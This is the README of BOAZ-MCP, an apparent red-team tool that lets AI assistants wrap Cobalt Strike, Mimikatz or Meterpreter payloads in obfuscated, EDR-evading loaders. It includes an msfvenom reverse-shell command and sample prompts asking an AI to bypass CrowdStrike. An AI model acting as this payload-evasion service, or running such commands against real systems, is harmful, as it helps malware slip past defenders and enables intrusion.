<div align="center">
  <img src="BOAZ-MCP.png" alt="BOAZ MCP Logo" width="300">
</div>

**BOAZ (Bypass, Obfuscate, Adapt, Zero-trace)** - MCP Integration for AI-Assisted Red Team Operations

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![Platform](https://img.shields.io/badge/platform-Linux-lightgrey.svg)

## What is BOAZ-MCP?

BOAZ-MCP is an AI-powered evasion framework for authorised red team operations. It wraps the [BOAZ framework](https://github.com/thomasxm/Boaz_beta) with a Model Context Protocol (MCP) server, enabling AI assistants to generate sophisticated payloads through natural language conversations.

**Key Capabilities:**
- 77+ process injection loaders with advanced evasion techniques
- LLVM-based obfuscation (Pluto, Akira) with control flow flattening
- 12 encoding schemes (AES, ChaCha20, UUID, XOR, etc.)
- Direct syscalls, API unhooking, ETW patching, sleep obfuscation
- Anti-emulation, entropy reduction, binary hardening

Simply describe your requirements to an AI assistant, and BOAZ-MCP handles the technical complexity of payload generation, obfuscation, and evasion configuration.

> **WARNING**: For authorised security testing only. Obtain written permission before use. Users are responsible for legal compliance.

## What BOAZ Does (Important!)

**BOAZ is NOT a malware generator - it's a malware wrapper and obfuscator.**

### How It Works:

1. **You provide an existing payload** (INPUT):
   - Cobalt Strike beacon.exe
   - Mimikatz.exe
   - Meterpreter executable
   - Sliver implant
   - Any Windows PE file you want to make evasive

2. **BOAZ wraps and obfuscates it**:
   - Converts your payload to shellcode
   - Encodes it (AES, UUID, etc.)
   - Creates a new loader with evasion techniques
   - Applies LLVM obfuscation
   - Adds anti-analysis features

3. **Output: Evasive version** (OUTPUT):
   - Your original payload, now harder to detect
   - Wrapped in advanced evasion techniques
   - Ready for testing

### What You Need Before Using BOAZ:

**Required:**
- Your own malicious payload (beacon.exe, mimikatz.exe, meterpreter, etc.)
- Or use the included `notepad.exe` for testing the framework

**Generating Test Payloads:**
```bash
# Meterpreter (using Metasploit)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o payload.exe

# Cobalt Strike (using CS teamserver)
# Generate beacon via Cobalt Strike GUI

# Mimikatz
# Download from https://github.com/gentilkiwi/mimikatz/releases
```

**Testing Without Malware:**
BOAZ includes `notepad.exe` for testing. Use this to verify BOAZ works before using real payloads:
```bash
python3 Boaz.py -f notepad.exe -o output/test.exe -l 16 -e uuid
```

## Setup

### Prerequisites
- Linux (Debian/Kali preferred)
- Python 3.8+, Wine, CMake, Git, GCC, G++, MingW, LLVM, NASM

### Installation

```bash
git clone https://github.com/Yenn503/BOAZ-MCP.git
cd BOAZ-MCP
chmod +x setup.sh
./setup.sh
```

### MCP Configuration

Add to your MCP client config:

**Cursor IDE** (`~/.cursor/mcp.json`):
```json
{
  "mcpServers": {
    "boaz": {
      "command": "python3",
      "args": ["/path/to/BOAZ-MCP/boaz_mcp/server.py"],
      "env": {
        "BOAZ_PATH": "/path/to/BOAZ-MCP/BOAZ_beta"
      }
    }
  }
}
```

Replace `/path/to/BOAZ-MCP` with your installation directory. Restart your MCP client after configuration.

## Usage

BOAZ-MCP is designed for natural language interaction. Simply describe what you need:

### Basic Payload Generation
```
"I have beacon.exe from my Cobalt Strike server.
Generate a basic evasive version."
```
AI wraps your beacon.exe with loader 16 + UUID encoding.

### Advanced Obfuscation
```
"I have mimikatz.exe. Create a version with LLVM obfuscation
for maximum stealth."
```
AI wraps your mimikatz.exe with Akira compiler + advanced obfuscation.

### EDR Evasion
```
"I'm targeting CrowdStrike with my meterpreter payload.
Generate an EDR bypass with memory guard loaders, AES encoding,
ETW patching, and anti-emulation checks."
```
AI wraps your meterpreter with loader 51 + AES + full evasion suite.

### Testing BOAZ (No Real Malware)
```
"I want to test BOAZ. Use the included notepad.exe
to verify it works."
```
AI wraps the safe notepad.exe to verify BOAZ is working properly.

### Entropy Optimisation
```
"My wrapped payload has high entropy and keeps getting flagged.
Can you help optimise it?"
```
AI analyses and regenerates with entropy reduction.

### Loader Discovery
```
"Show me all threadless injection loaders"
```
AI lists available loaders by category.

**Remember:** You must provide your own malicious payload as input (beacon.exe, mimikatz.exe, etc.), or use the included `notepad.exe` for testing.

## Available MCP Tools

- **generate_payload** - Generate evasive payloads from PE files
- **list_loaders** - Display available process injection loaders
- **list_encoders** - Show supported encoding schemes
- **analyze_binary** - Analyse binary characteristics and entropy
- **validate_options** - Validate BOAZ configuration parameters

## Documentation

- **[AI_AGENTS.md](AI_AGENTS.md)** - Complete guide for AI assistants
- **[INSTALL.md](INSTALL.md)** - Detailed installation instructions
- **[USAGE.md](USAGE.md)** - Usage examples and workflows
- **[API.md](API.md)** - MCP API reference and loader documentation
- **[mcp_config.json](mcp_config.json)** - Configuration examples

## Security

**Authorised Use Only:**
- Obtain written permission before testing
- Use only in isolated environments or with explicit authorisation
- Comply with all applicable laws and regulations
- Document all testing activities

**Operational Security:**
- Never use on production systems without authorisation
- Maintain chain of custody for generated payloads
- Implement proper access controls

## License & Disclaimer

Licensed under MIT. THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND. Users assume all responsibility for ensuring their activities are legal and authorised.

## Contributing

Contributions welcome! Fork the repository, create a feature branch, and submit a pull request.

**Repository**: https://github.com/Yenn503/BOAZ-MCP
**Issues**: https://github.com/Yenn503/BOAZ-MCP/issues
**Original BOAZ**: https://github.com/thomasxm/Boaz_beta
